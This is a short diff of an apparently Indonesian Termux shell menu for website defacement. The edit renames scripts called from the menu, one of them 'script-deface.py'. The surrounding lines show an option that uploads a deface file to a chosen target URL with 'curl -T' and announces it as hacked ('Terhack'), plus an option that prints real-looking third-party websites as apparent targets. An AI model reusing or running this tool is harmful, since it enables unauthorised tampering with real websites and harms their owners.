@@ -52,7 +52,7 @@ echo "\033[32;1m"
 read -p " Pilih Nomornya =>" pil;
 
 case $pil in
-1) python2 5.py
+1) python2 script-deface.py
 
 ;;
 2) cd /data/data/com.termux/files/home
@@ -62,7 +62,7 @@ curl -T /sdcard/$sc $T
 echo "[!] Terhack => " $T/$sc | lolcat
 cd deface
 ;;
-3) sh A.sh
+3) sh 3.sh
 ;;
 4) echo "http://bee-it.co.za" | lolcat
 echo "http://butterflowers.co.za" | lolcat
